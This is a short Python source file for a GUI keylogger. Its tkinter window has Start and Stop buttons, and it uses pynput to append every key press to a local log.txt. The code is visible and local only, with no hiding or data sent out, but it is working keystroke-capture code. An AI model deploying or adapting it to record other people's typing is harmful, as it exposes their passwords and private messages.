import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("300x200")

        # Create Start Button
        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=20)

        #Create Stop Button
        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=20)

        self.listener = None

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        messagebox.showinfo("Keylogger", "Keylogger Started")

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
            messagebox.showinfo("Keylogger", "Keylogger Stopped")

    def on_press(self, key):
        try:
            with open("log.txt", "a") as log_file:
                log_file.write(f'{key.char}')
        except AttributeError:
            with open("log.txt", "a") as log_file:
                log_file.write(f'{key}')

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()